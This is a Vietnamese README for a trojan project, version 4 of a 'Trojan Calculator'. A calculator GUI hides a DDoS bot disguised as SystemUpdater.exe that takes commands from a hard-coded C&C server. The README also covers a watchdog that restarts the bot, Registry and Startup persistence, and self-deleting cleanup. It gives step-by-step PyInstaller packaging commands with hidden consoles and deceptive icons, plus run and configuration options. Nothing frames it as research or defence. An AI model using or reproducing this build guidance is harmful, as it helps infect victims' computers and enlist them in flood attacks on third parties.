# Trojan Calculator - Phiên Bản 4 (V4)

## Tổng Quan

Phiên bản 4 của dự án Trojan Calculator tích hợp bot tấn công DDoS vào trojan, cho phép thực hiện các cuộc tấn công như HTTP Flood, TCP Flood, UDP Flood, và Slowloris. Trojan tiếp tục ngụy trang dưới dạng máy tính cầm tay (GUI Tkinter) với icon tùy chỉnh, giữ nguyên cơ chế watchdog và persistence từ phiên bản trước.

## Tính Năng

- **Giao Diện Máy Tính Cầm Tay**: Giao diện tính toán cơ bản với icon tùy chỉnh.
- **Bot DDoS (`SystemUpdater.exe`)**: 
  - Chạy ngầm, thực hiện tấn công DDoS khi nhận lệnh từ máy chủ C&C.
  - Sử dụng mã hóa RSA với OAEP padding cho giao tiếp an toàn.
  - Hỗ trợ cấu hình qua tham số dòng lệnh (`cnc_ip`, `cnc_port`, `offset`, `rate`).
- **Watchdog (`watchdog.exe`)**: 
  - Độc lập, giám sát và khởi động lại `SystemUpdater.exe` nếu bị kill.
  - Ghi log vào `%APPDATA%\watchdog_log.txt`.
- **Cơ Chế Duy Trì**: Tự động chạy `watchdog.exe` từ Registry hoặc Startup folder khi khởi động máy.
- **Tự Hủy**: Dọn dẹp file, Registry, và log khi thoát.
- **Ghi Nhật Ký**: 
  - `%APPDATA%\trojan.log`: Hoạt động của trojan.
  - `%APPDATA%\system_log.txt`: Trạng thái và tấn công của bot.

## Cấu Trúc

- **`calculator_trojan_V4.py`**: Script chính, khởi chạy GUI, triển khai bot và watchdog.
- **`bot_test_V4.py`**: Script bot (đóng gói thành `SystemUpdater.exe`) thực hiện tấn công DDoS.
- **`watchdog.py`**: Script watchdog (đóng gói thành `watchdog.exe`) giám sát bot.

## Cách Xây Dựng và Chạy

### Cài Đặt Thư Viện
```bash
pip install cryptography
```

### Đóng Gói `bot_test_V4.py`
```bash
pyinstaller --noconsole --onefile --icon=SystemUpdater.ico --hidden-import=psutil --hidden-import=cryptography bot_test_V4.py
copy dist\bot_test_V4.exe SystemUpdater.exe
```

### Đóng Gói `watchdog.py`
```bash
pyinstaller --noconsole --onefile --icon=watchdog.ico --hidden-import=psutil watchdog.py
copy dist\watchdog.exe watchdog.exe
```

### Đóng Gói `calculator_trojan_V4.py`
- Đảm bảo `SystemUpdater.exe` và `watchdog.exe` đã có trong thư mục hiện tại.
```bash
pyinstaller --noconsole --onefile --icon=calculator.ico --add-data "SystemUpdater.exe;." --add-data "watchdog.exe;." --hidden-import=psutil --hidden-import=tkinter --hidden-import=pywin32 calculator_trojan_V4.py
```

### Chạy
- Chạy `calculator_trojan_V4.exe` với quyền Administrator.
- Bot kết nối với máy chủ C&C (mặc định `18.142.246.109:5001`) và chờ lệnh tấn công.
- Kiểm tra `%APPDATA%\system_log.txt` để theo dõi hoạt động bot.

### Tùy Chọn Dòng Lệnh (cho `SystemUpdater.exe`)
```bash
SystemUpdater.exe --cnc-ip <IP> --cnc-port <PORT> --offset <OFFSET> --rate <RATE>
```
- `--cnc-ip`: Địa chỉ IP của C&C (mặc định: `18.142.246.109`).
- `--cnc-port`: Cổng của C&C (mặc định: `5001`).
- `--offset`: Độ lệch thời gian (mặc định: `0`).
- `--rate`: Tốc độ tấn công (mặc định: `1ms`).

## Hạn Chế

- Cần quyền Administrator để truy cập `%APPDATA%` và Registry.
- Máy chủ C&C phải đang chạy để bot hoạt động.
- Chỉ thử nghiệm trên Windows.

## Lưu Ý

- Đảm bảo file icon `SystemUpdater.ico`, `watchdog.ico`, và `calculator.ico` có trong thư mục dự án.
- Cài đặt thư viện `cryptography` trước khi đóng gói.
